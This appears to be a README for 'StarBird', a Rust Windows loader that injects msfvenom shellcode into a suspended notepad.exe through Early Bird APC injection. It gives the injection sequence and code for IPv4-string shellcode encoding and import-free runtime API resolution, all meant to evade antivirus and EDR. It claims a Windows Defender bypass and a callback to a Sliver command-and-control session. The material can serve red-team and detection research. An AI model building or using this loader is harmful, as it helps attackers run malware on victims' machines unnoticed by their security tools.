## What is this?

**StarBird** is a Windows loader prototype that demonstrates Early Bird APC Injection — a process injection technique that executes shellcode inside a legitimate Windows process *before* any AV/EDR DLLs are loaded into it.

Key properties of this loader:

- **No suspicious IAT entries** — all NT APIs resolved at runtime via [Stargate](https://github.com/Teach2Breach/stargate) (signature-based, no PEB walking)
- **No recognizable shellcode on disk** — payload encoded as IPv4 address strings (IPfuscation), decoded at runtime using `RtlIpv4StringToAddressA`
- **No RWX memory** — allocates RW, writes shellcode, then flips to RX before queuing the APC
- **Tested on Windows 11 Build 26100** — bypassed Windows Defender

## How it works

### Early Bird APC Injection

When Windows creates a process with the `CREATE_SUSPENDED` flag, the primary thread is paused before any user-mode code runs — crucially, *before* EDR DLLs are injected into the target process.

When the thread is eventually resumed, the Windows loader calls `NtTestAlert()` internally, which drains the thread's APC queue **before** transferring control to the program's real entry point (`RtlUserThreadStart`). This is the window we exploit.


**Injection steps:**

```
1. CreateProcessW(notepad.exe, CREATE_SUSPENDED)
         │
         ▼
2. NtAllocateVirtualMemory(hProcess, RW, size)
         │
         ▼
3. ip_to_bytes(shellcode_ips)  ← decode IPv4 list → raw bytes
         │
         ▼
4. NtWriteVirtualMemory(hProcess, base_addr, payload)
         │
         ▼
5. NtProtectVirtualMemory(hProcess, base_addr, RX)   ← no RWX ever
         │
         ▼
6. NtQueueApcThread(hThread, base_addr)
         │
         ▼
7. ResumeThread(hThread)  → shellcode executes → stager calls back → Sliver session
```

### IPfuscation — Shellcode Obfuscation

Raw shellcode bytes are trivially detected by static AV scanners. IPfuscation encodes every 4 bytes of shellcode as a dotted-decimal IPv4 string:

```
\xfc\x48\x83\xe4  →  "252.72.131.228"
\xf0\xe8\xcc\x00  →  "240.232.204.0"
```

 ipfuscator.py script converts the msfvenom-generated `.bin` to a Rust array literal:


At runtime, `decoder.rs` uses `RtlIpv4StringToAddressA` (a legitimate Windows API from ntdll) to parse each string back into 4 bytes — no custom XOR keys, no decryption routines, just a Windows API doing what it was designed to do.

```rust
// decoder.rs
RtlIpv4StringToAddressA(
    PCSTR(ip_str.as_ptr()),
    false,
    &mut terminator,
    temp_bytes.as_mut_ptr() as *mut _
);
shellcode.extend_from_slice(&temp_bytes);
```

### Stargate API Resolver

Rather than importing suspicious functions statically (which shows up in the IAT) or walking the PEB (a well-known malware pattern), we use [**Stargate**](https://github.com/Teach2Breach/stargate) by Teach2Breach.

Stargate does two things differently:

| Technique | Traditional | Stargate |
|---|---|---|
| Find DLL base | PEB walk (`InMemoryOrderModuleList`) | Call-stack inspection |
| Find function | Parse EAT by name hash | Byte signature scanning |

This means:
- No PEB traversal pattern in memory
- No suspicious API names in the binary's import table

```rust
// resolver.rs
let resolver = StargateResolver::new()?;

// All resolved at runtime — zero static imports
let nt_alloc:     NtAllocateVM  = transmute(resolver.resolve_nt("NtAllocateVirtualMemory")?);
let nt_write:     NtWriteVM     = transmute(resolver.resolve_nt("NtWriteVirtualMemory")?);
let nt_protect:   NtProtectVM   = transmute(resolver.resolve_nt("NtProtectVirtualMemory")?);
let nt_queue_apc: NtQueueApc    = transmute(resolver.resolve_nt("NtQueueApcThread")?);
let create_proc:  CreateProcessW = transmute(resolver.resolve_k32("CreateProcessW")?);
let resume:       ResumeThread  = transmute(resolver.resolve_k32("ResumeThread")?);
```
